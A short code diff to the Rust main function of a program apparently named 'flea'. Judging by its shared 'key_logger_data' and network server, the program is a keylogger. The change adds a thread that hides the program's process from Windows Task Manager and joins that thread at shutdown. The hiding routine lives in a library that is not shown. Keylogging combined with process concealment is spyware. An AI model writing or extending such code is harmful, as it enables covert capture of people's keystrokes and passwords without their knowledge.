@@ -48,6 +48,7 @@ fn main()
 
     //remove the file name from the path
     let program_dir = program_dir.replace(&args[0].split(&separator).last().unwrap(), "");    
+    println!("Program dir: {}", program_dir);
     env::set_current_dir(&program_dir).unwrap();
 
     //Check if backup file exists
@@ -115,6 +116,12 @@ fn main()
         run(current_path, kl);
     });
     
+    //Hide flea process in Task Manager (only on Windows)
+    let kl2 = Arc::clone(&key_logger_data);
+    let handle2 = thread::spawn(move|| {
+        flealib::hideflea::hide_flea_process(kl2);
+    });
+
     let flea_server = FleaServer{};
     
     flea_server.start(&address, &running);
@@ -122,6 +129,7 @@ fn main()
     key_logger_data.lock().unwrap().quit = true;
 
     handle.join().unwrap();
+    handle2.join().unwrap();
 
     info!("Stop");
     
